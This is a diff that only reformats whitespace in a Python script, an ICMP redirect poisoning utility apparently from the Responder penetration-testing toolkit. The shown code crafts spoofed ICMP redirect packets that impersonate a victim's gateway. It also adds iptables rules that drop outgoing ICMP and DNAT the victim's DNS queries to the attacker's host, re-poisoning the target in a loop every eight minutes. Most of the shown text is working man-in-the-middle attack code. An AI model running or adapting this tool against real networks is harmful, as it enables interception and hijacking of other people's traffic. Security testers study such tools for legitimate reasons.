@@ -12,7 +12,7 @@
 # but WITHOUT ANY WARRANTY; without even the implied warranty of
 # MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 # GNU General Public License for more details.
-# 
+#
 # You should have received a copy of the GNU General Public License
 # along with this program.  If not, see <http://www.gnu.org/licenses/>.
 import sys,socket,struct,optparse,random,pipes
@@ -43,32 +43,32 @@ parser.add_option('-a', '--alternate',action="store", help="The alternate gatewa
 options, args = parser.parse_args()
 
 if options.OURIP is None:
-   print "-i mandatory option is missing.\n"
-   parser.print_help()
-   exit(-1)
+    print "-i mandatory option is missing.\n"
+    parser.print_help()
+    exit(-1)
 
 if options.OriginalGwAddr is None:
-   print "-g mandatory option is missing, please provide the original gateway address.\n"
-   parser.print_help()
-   exit(-1)
+    print "-g mandatory option is missing, please provide the original gateway address.\n"
+    parser.print_help()
+    exit(-1)
 
 if options.VictimIP is None:
-   print "-t mandatory option is missing, please provide a target.\n"
-   parser.print_help()
-   exit(-1)
+    print "-t mandatory option is missing, please provide a target.\n"
+    parser.print_help()
+    exit(-1)
 
 if options.Interface is None:
-   print "-I mandatory option is missing, please provide your network interface.\n"
-   parser.print_help()
-   exit(-1)
+    print "-I mandatory option is missing, please provide your network interface.\n"
+    parser.print_help()
+    exit(-1)
 
 if options.ToThisHost is None:
-   print "-r mandatory option is missing, please provide a destination target.\n"
-   parser.print_help()
-   exit(-1)
+    print "-r mandatory option is missing, please provide a destination target.\n"
+    parser.print_help()
+    exit(-1)
 
 if options.AlternateGwAddr is None:
-   AlternateGwAddr = options.OURIP
+    AlternateGwAddr = options.OURIP
 
 #Setting some vars.
 OURIP = options.OURIP
@@ -80,9 +80,9 @@ ToThisHost2 = options.ToThisHost2
 Interface = options.Interface
 
 def Show_Help(ExtraHelpData):
-   help = "\nICMP Redirect Utility 0.1.\nCreated by Laurent Gaffie, please send bugs/comments to lgaffie@trustwave.com\n\nThis utility combined with Responder is useful when you're sitting on a Windows based network.\nMost Linux distributions discard by default ICMP Redirects.\n"
-   help+= ExtraHelpData
-   print help
+    help = "\nICMP Redirect Utility 0.1.\nCreated by Laurent Gaffie, please send bugs/comments to lgaffie@trustwave.com\n\nThis utility combined with Responder is useful when you're sitting on a Windows based network.\nMost Linux distributions discard by default ICMP Redirects.\n"
+    help+= ExtraHelpData
+    print help
 
 MoreHelp = "Note that if the target is Windows, the poisoning will only last for 10mn, you can re-poison the target by launching this utility again\nIf you wish to respond to the traffic, for example DNS queries your target issues, launch this command as root:\n\niptables -A OUTPUT -p ICMP -j DROP && iptables -t nat -A PREROUTING -p udp --dst %s --dport 53 -j DNAT --to-destination %s:53\n\n"%(ToThisHost,OURIP)
 
@@ -133,9 +133,9 @@ class ARPWhoHas(Packet):
 
     ])
 
-    def calculate(self): 
+    def calculate(self):
         self.fields["DstIP"] = inet_aton(self.fields["DstIP"])
-        self.fields["SenderIP"] = inet_aton(OURIP)    
+        self.fields["SenderIP"] = inet_aton(OURIP)
 
 #####################################################################
 #ICMP Redirect Packets
@@ -165,9 +165,9 @@ class IPPacket(Packet):
 
     ])
 
-    def calculate(self): 
+    def calculate(self):
         self.fields["TID"] = chr(randrange(256))+chr(randrange(256))
-        self.fields["SrcIP"] = inet_aton(str(self.fields["SrcIP"])) 
+        self.fields["SrcIP"] = inet_aton(str(self.fields["SrcIP"]))
         self.fields["DestIP"] = inet_aton(str(self.fields["DestIP"]))
         # Calc Len First
         CalculateLen = str(self.fields["VLen"])+str(self.fields["DifField"])+str(self.fields["Len"])+str(self.fields["TID"])+str(self.fields["Flag"])+str(self.fields["FragOffset"])+str(self.fields["TTL"])+str(self.fields["Cmd"])+str(self.fields["CheckSum"])+str(self.fields["SrcIP"])+str(self.fields["DestIP"])+str(self.fields["Data"])
@@ -186,9 +186,9 @@ class ICMPRedir(Packet):
 
     ])
 
-    def calculate(self): 
+    def calculate(self):
         #Set the values
-        self.fields["GwAddr"] = inet_aton(OURIP)  
+        self.fields["GwAddr"] = inet_aton(OURIP)
         # Then CheckSum this packet
         CheckSumCalc =str(self.fields["Type"])+str(self.fields["OpCode"])+str(self.fields["CheckSum"])+str(self.fields["GwAddr"])+str(self.fields["Data"])
         self.fields["CheckSum"] = GenCheckSum(CheckSumCalc)
@@ -212,15 +212,15 @@ def ReceiveArpFrame(DstAddr):
     Arp.calculate()
     final = str(Eth)+str(Arp)
     try:
-       s.send(final)
-       data = s.recv(1024)
-       DstMac = data[22:28]
-       DestMac = DstMac.encode('hex')
-       PrintMac = ":".join([DestMac[x:x+2] for x in xrange(0, len(DestMac), 2)])
-       return PrintMac,DstMac
+        s.send(final)
+        data = s.recv(1024)
+        DstMac = data[22:28]
+        DestMac = DstMac.encode('hex')
+        PrintMac = ":".join([DestMac[x:x+2] for x in xrange(0, len(DestMac), 2)])
+        return PrintMac,DstMac
     except:
-       print "[ARP]%s took too long to Respond. Please provide a valid host.\n"%(DstAddr)
-       exit(1)
+        print "[ARP]%s took too long to Respond. Please provide a valid host.\n"%(DstAddr)
+        exit(1)
 
 def IcmpRedirectSock(DestinationIP):
     PrintMac,DestMac = ReceiveArpFrame(VictimIP)
@@ -235,7 +235,7 @@ def IcmpRedirectSock(DestinationIP):
     IPPackUDP.calculate()
     ICMPPack = ICMPRedir(GwAddr=AlternateGwAddr,Data=str(IPPackUDP))
     ICMPPack.calculate()
-    IPPack = IPPacket(SrcIP=OriginalGwAddr,DestIP=VictimIP,TTL="\x40",Data=str(ICMPPack)) 
+    IPPack = IPPacket(SrcIP=OriginalGwAddr,DestIP=VictimIP,TTL="\x40",Data=str(ICMPPack))
     IPPack.calculate()
     final = str(Eth)+str(IPPack)
     s.send(final)
@@ -243,12 +243,12 @@ def IcmpRedirectSock(DestinationIP):
 
 def FindWhatToDo(ToThisHost2):
     if ToThisHost2 != None:
-       Show_Help('Hit CRTL-C to kill this script')
-       RunThisInLoop(ToThisHost, ToThisHost2,OURIP)
+        Show_Help('Hit CRTL-C to kill this script')
+        RunThisInLoop(ToThisHost, ToThisHost2,OURIP)
     if ToThisHost2 == None:
-       Show_Help(MoreHelp)
-       IcmpRedirectSock(DestinationIP=ToThisHost)
-       exit()
+        Show_Help(MoreHelp)
+        IcmpRedirectSock(DestinationIP=ToThisHost)
+        exit()
 
 def RunThisInLoop(host, host2, ip):
     dns1 = pipes.quote(host)
@@ -258,10 +258,9 @@ def RunThisInLoop(host, host2, ip):
     call("iptables -A OUTPUT -p ICMP -j DROP && iptables -t nat -A PREROUTING -p udp --dst "+dns2+" --dport 53 -j DNAT --to-destination "+ouripadd+":53", shell=True)
     print "[+]Automatic mode enabled\nAn iptable rules has been added for both DNS servers."
     while True:
-       IcmpRedirectSock(DestinationIP=dns1)
-       IcmpRedirectSock(DestinationIP=dns2)
-       print "[+]Repoisoning the target in 8 minutes..."
-       sleep(480)
+        IcmpRedirectSock(DestinationIP=dns1)
+        IcmpRedirectSock(DestinationIP=dns2)
+        print "[+]Repoisoning the target in 8 minutes..."
+        sleep(480)
 
 FindWhatToDo(ToThisHost2)
-
